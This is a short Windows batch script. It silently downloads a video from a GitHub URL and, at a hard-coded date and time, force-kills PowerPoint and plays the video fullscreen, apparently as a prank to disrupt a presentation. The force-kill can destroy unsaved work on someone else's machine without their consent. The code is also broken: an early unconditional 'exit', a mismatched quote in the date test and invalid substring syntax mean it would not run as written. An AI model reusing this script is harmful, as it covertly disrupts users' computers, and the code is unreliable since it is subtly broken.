@echo off

exit

if not exist "%TEMP%\ataturk.mp4" (
bitsadmin /transfer vidjob /download /priority high "https://raw.githubusercontent.com/similartobash/rc/main/video.mp4" "%TEMP%\ataturk.mp4"
)

if "%date% == "Çar 14.12.2022" (
:timeloop
if "%time:0,5%" == " 9:50" (
taskkill /f /im POWERPNT.EXE
set video2play="%TEMP%\ataturk.mp4"
set wmplayer="%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" /prefetch:1
%wmplayer% %video2play% /fullscreen
) else (
timeout /t 10
goto :timeloop
)
)

exit
